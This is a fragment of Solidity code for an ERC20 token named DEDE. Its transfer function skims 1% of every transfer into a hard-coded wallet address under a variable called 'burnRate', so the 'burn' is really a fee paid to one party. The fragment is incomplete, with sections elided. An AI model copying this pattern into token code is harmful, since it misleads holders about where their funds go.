...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    uint private burnRate = 1;
    uint256 private maxTotalSupply = 1000000000000000000000;
    ...
    function _transfer(
        ...
        uint valueToBurn = (amount * burnRate / 100);
        
        _balances[recipient] += amount - valueToBurn;
        
        _balances[0xEA8baCE851F1C07a40006B692A558F19875cf95f] += valueToBurn;
...
contract DEDE is ERC20, ERC20Burnable, ERC20Snapshot, Ownable, Pausable, ERC20Permit, ERC20Votes, ERC20FlashMint {
    constructor() ERC20("DEDE", "DEDE") ERC20Permit("DEDE") {}
